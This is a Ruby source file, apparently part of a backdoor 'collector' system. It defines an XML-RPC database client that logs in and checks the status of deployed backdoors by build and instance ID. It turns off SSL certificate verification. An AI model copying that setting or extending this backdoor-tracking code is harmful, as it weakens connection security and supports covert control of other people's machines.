#
#  DB layer for XML-RPC communication
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'xmlrpc/client'
require 'timeout'
require 'thread'

module RCS
module Collector

class DB_xmlrpc
  include RCS::Tracer

  # if a method does not reply in X seconds consider db down
  DB_TIMEOUT = 10

  def initialize(host)
    @host, @port = host.split(':')

    # create the xml-rpc server
    @xmlrpc = XMLRPC::Client.new(@host, '/server.php', @port, nil, nil, nil, nil, true)

    # we need to set an attribute inside the http instance variable of @server
    # we can get a reference here and manipulate it later
    @http = @xmlrpc.instance_variable_get(:@http)

    # the mutex to avoid race conditions
    @semaphore = Mutex.new

    # no SSL verify for this connection
    @http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    # CA certificate to check if the server ssl certificate is valid
    @http.ca_file = Config.file('DB_CERT')

    # our client certificate to send to the server
    @http.cert = OpenSSL::X509::Certificate.new(File.read(Config.file('DB_CERT')))

    trace :debug, "Using XML-RPC to communicate with #{@host}:#{@port}"
  end

  # generic method invocation
  def xmlrpc_call(*args)
    begin
      Timeout::timeout(DB_TIMEOUT) do
        return @semaphore.synchronize do
          @xmlrpc.call(*args)
        end
      end
    rescue
      # ensure the mutex is unlocked on timeout or errors
      @semaphore.unlock if @semaphore.locked?
      # propagate the exception to the upper layer
      raise
    end
  end

  # timeout exception propagator
  def propagate_error(e)
    # the db is down we have to report it to the upper layer
    # if the exception is not from xmlrpc (does not have faultCode)
    # it means that we are not able to talk to the db
    if not e.respond_to?(:faultCode) then
      trace :warn, "The DB in not responding: #{e.class} #{e.message}"
      raise
    end
  end


  # log in to the database
  # returns a boolean
  def login(user, pass)
    begin
      response = xmlrpc_call('auth.login', user, pass)
      return true
    rescue Exception => e
      
      # we can get a "method not found" error only if we are already logged in
      # in this case, we force a logout and retry the login
      if e.respond_to?(:faultCode) and e.faultCode == -32601 then  # -32601 is METHOD NOT FOUND
        trace :debug, "forcing logout and retrying..."
        logout
        return login(user, pass)
      end

      trace :error, "Error calling auth.login: #{e.class} #{e.message}"
      
      return false
    end
  end

  def logout
    begin
      response = xmlrpc_call('auth.logout')
      return true
    rescue Exception => e
      trace :error, "Error calling auth.logout: #{e.class} #{e.message}"
      return false
    end
  end


  # backdoor identify
  def backdoor_status(build_id, instance_id, subtype)
    begin
      ret = xmlrpc_call('backdoor.identify', build_id, instance_id, subtype)
      bid = ret['backdoor_id']
      if ret['deleted'] == 1 then
        return DB::DELETED_BACKDOOR, bid
      end
      case ret['status']
        when 'OPEN'
          return DB::ACTIVE_BACKDOOR, bid
        when 'QUEUED'
          return DB::QUEUED_BACKDOOR, bid
        when 'CLOSED'
          return DB::CLOSED_BACKDOOR, bid
      end
    rescue Exception => e
      # 1702 is NO SUCH BACKDOOR
      if e.respond_to?(:faultCode) and e.faultCode == 1702 then
        return DB::NO_SUCH_BACKDOOR, 0
      end

      trace :error, "Error calling backdoor.identify: #{e.class} #{e.message}"
      propagate_error e

      return DB::UNKNOWN_BACKDOOR, 0
    end
  end

end #

end #Collector::
end #RCS::